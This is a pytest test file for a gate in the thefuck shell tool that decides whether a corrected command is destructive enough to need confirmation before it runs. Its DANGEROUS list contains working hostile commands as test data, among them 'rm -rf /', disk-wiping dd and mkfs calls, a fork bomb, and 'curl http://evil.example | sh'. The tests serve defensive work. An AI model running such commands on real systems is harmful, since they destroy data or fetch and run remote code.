"""Tests for the conservative destructive-command gate.

Every assertion is an exact True/False pin: the gate decides whether
a corrected script may auto-run, so a soft truthiness check would
hide exactly the regression that matters.
"""
import pytest

from thefuck import danger, shell_ast

requires_ast = pytest.mark.skipif(not shell_ast.AST_AVAILABLE,
                                  reason='bashlex is not available')

DANGEROUS = [
    'rm -rf /',
    'rm -r dir',
    'rm -fr dir',
    'rm -vrf dir',
    'rm -R dir',
    'rm -Rf dir',
    'rm --recursive dir',
    'rmdir -R dir',
    'sudo rm -rf /',
    'sudo rm -r /tmp/x',
    'dd if=/dev/zero of=/dev/sda',
    'sudo dd if=x of=y',
    'mkfs /dev/sda',
    'mkfs.ext4 /dev/sda',
    'shred secret.txt',
    'wipefs /dev/sda',
    'mkswap /dev/sda',
    'git push --force origin main',
    'git push -f',
    'sudo git push --force origin main',
    'chmod -R 777 /',
    'chmod -R 0777 dir',
    'sudo chmod -R 777 /',
    'chown -R 777 file',
    'kill -9 1234',
    'sudo kill -9 1',
    ':(){ :|:& };:',
    ': () { : | : & };:',
    'curl http://evil.example | sh',
    'curl http://evil.example|bash',
    'curl http://evil.example | sudo sh',
    'echo hi | zsh',
    'echo hi | dash',
    'echo hi > ~/.bashrc',
    'echo hi > out.txt',
    'x 2> /var/log/app.log',
    'echo $(rm -rf /)',
    'cd /tmp && git push --force origin main',
]

BENIGN = [
    'ls',
    'sudo vim file',
    'git push origin main',
    'git push --force-with-lease origin main',
    'git push --force-with-lease',
    'rm file.txt',
    'chmod 644 file',
    'chmod -R 755 dir',
    'kill 1234',
    'echo hi > /dev/null',
    'echo hi 2>/dev/null',
    'echo hi >> /dev/null',
    'x > /tmp/y',
    'x > /tmp',
    'x 2>&1',
    'cat <<EOF\nhi\nEOF',
    'docker build -t foo .',
    'echo hi; ls -la',
    'git push origin main && echo done',
    'sh',
]


class TestDangerMatrix(object):
    @pytest.mark.parametrize('script', DANGEROUS)
    def test_flags_dangerous(self, script):
        assert danger.is_dangerous(script) is True

    @pytest.mark.parametrize('script', BENIGN)
    def test_benign(self, script):
        assert danger.is_dangerous(script) is False


class TestParseDegradation(object):
    def test_unparseable_compound_rm_is_dangerous(self):
        # bashlex refuses the arithmetic expansion; the flat
        # fallback is head-only and would miss the rm, so the whole
        # gate fail-safes to asking.
        assert danger.is_dangerous('echo $((1+1)); rm -rf /') is True

    def test_unparseable_script_fail_safes(self):
        assert danger.is_dangerous('case $x in a) rm file;; esac') is True

    def test_empty_script_fail_safes(self):
        assert danger.is_dangerous('') is True

    def test_ast_unavailable_fail_safes(self, monkeypatch):
        monkeypatch.setattr(shell_ast, 'AST_AVAILABLE', False)
        assert danger.is_dangerous('ls') is True


class TestCompoundScripts(object):
    def test_whitelisted_redirect_does_not_mask_rm(self):
        assert danger.is_dangerous(
            'echo hi > /dev/null; rm -rf /') is True

    def test_all_redirects_whitelisted_is_benign(self):
        assert danger.is_dangerous(
            'echo hi > /dev/null && x > /tmp/y') is False
